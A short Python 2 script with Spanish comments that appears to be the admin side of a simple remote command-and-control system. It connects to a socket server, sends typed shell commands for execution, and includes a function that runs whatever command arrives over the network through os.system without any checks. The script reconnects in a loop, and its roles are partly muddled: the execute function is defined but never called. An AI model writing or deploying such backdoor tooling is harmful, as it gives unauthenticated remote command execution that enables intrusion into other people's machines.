#! /usr/bin/env python
# -*- coding: utf-8 -*-

from socket import *
import os
import time

SERVER_ADDRESS = 'localhost'
SERVER_PORT = 55567


def ejecuta_cmd(comandoant):
    ''' Funcion para ejecutar comandos en base a las ordenes recibidas. '''
    clientsocket.send('w8cmd')
    comando = clientsocket.recv(1024)
    if comando != '' and comando != comandoant:
        print 'Ejecutando comando: %s' % comando
        os.system(comando)
        comandoant = comando
        return comandoant
    else:
        return comandoant


if __name__ == '__main__':
    conexion = False
    while True:
        if conexion == True:
            clientsocket.send('admin')
            instruccion = clientsocket.recv(buf)
            if instruccion == 'incmd':
                while instruccion != '':
                    comando = raw_input('cmd > ')
                    if comando.strip() != '':
                        clientsocket.send(comando)
                        instruccion = clientsocket.recv(buf)
                        print instruccion
            if instruccion == '':
                conexion = False
        else:
            try:
                host = SERVER_ADDRESS
                port = SERVER_PORT
                buf = 1024
                addr = (host, port)
                clientsocket = socket(AF_INET, SOCK_STREAM)
                clientsocket.connect(addr)
                print "Conectado con exito."
                print "Recibiendo informacion..."
                conexion = True
            except:
                conexion = False
                print "Error: imposible conectar."
                print "Esperando 30 segundos..."
                time.sleep(30)
